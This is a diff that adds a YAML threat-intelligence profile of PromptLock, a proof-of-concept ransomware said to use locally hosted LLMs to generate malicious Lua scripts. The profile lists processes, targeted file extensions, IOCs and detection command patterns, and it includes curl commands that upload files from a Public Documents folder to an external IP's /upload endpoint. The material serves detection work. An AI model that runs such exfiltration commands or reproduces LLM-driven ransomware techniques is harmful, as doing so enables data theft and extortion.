@@ -1,0 +1,89 @@
+description: PromptLock PoC ransomware uses locally hosted LLMs to dynamically generate
+  and run malicious Lua scripts for file enumeration, selective exfiltration, and
+  cross-platform payload actions.
+malware_families:
+- PromptLock
+TTPs:
+  processes:
+  - curl.exe
+  - cmd.exe
+  commandline:
+  - curl.exe -T *
+  - curl.exe --upload-file *
+  - curl.exe -d *
+  - curl.exe --data *
+  - curl.exe -F *
+  - curl -k -X POST "http://16.8.1.30:8080/upload" -F "session_key=1337" -F "file=C:\\Users\\Public\\Documents\\FinanceReport2025-Dummy.png"
+  - curl -k -X POST "http://16.0.1.30:8080/upload" -F "session_key=1337" -F "file=C:\\Users\\Public\\Documents\\FinanceReport2025-Burimy.png"
+  powershell: []
+  scripting_engine:
+  - Lua
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - PromptLock PoC ransomware->http://<URL1>
+  - PromptLock PoC ransomware->http://<URL2>
+  - PromptLock PoC ransomware->Ollama API
+  - cmd.exe, 16.8.1.30, 8080
+  - cmd.exe, 16.0.1.30, 8080
+  file_activity:
+  - target_file_list.log
+  - '*.cmd'
+  - '*.ini'
+  - '*.gif'
+  - '*.jpg'
+  - '*.jpeg'
+  - '*.db'
+  - '*.ps1'
+  - '*.doc'
+  - '*.docx'
+  - '*.xls'
+  - '*.xlsx'
+  - '*.ppt'
+  - '*.pptx'
+  - '*.bmp'
+  - '*.zip'
+  - '*.rar'
+  - '*.7z'
+  - '*.chm'
+  - '*.png'
+  - '*.log'
+  - '*.vbs'
+  - '*.js'
+  - '*.vhd'
+  - '*.bak'
+  - '*.wbcat'
+  - '*.bkf'
+  - '*.backup*'
+  - '*.dsk'
+  - '*.win'
+  - C:\\Users\\Public\\Documents\\FinanceReport2025-Dummy.png
+  - C:\\Users\\Public\\Documents\\FinanceReport2025-Burimy.png
+  persistence: []
+  process_relations:
+  - cmd.exe {95e246de-3198-3944} -> cmd.exe {95e246de-3198-3944}
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 16.8.1.30
+  - 16.0.1.30
+  domains: []
+  urls:
+  - http://<URL1>
+  - http://<URL2>
+  - http://16.8.1.30:8080/upload
+  - http://16.0.1.30:8080/upload
+authors:
+- Teoderick Contreras
+- Rod Soto
+- Michael Haag
+- Nasreddine Bencherchali
+- Lou Stella
+- Bhavin Patel
+- Eric McGinnis
+- Patrick Bareiss
+- Raven Tait
+- Jose Hernandez
+reference: https://www.splunk.com/en_us/blog/artificial-intelligence/promptlock-llm-ransomware-security-analysis
+date_of_publication: December 19, 2025
+file_creation_date: December 19, 2025
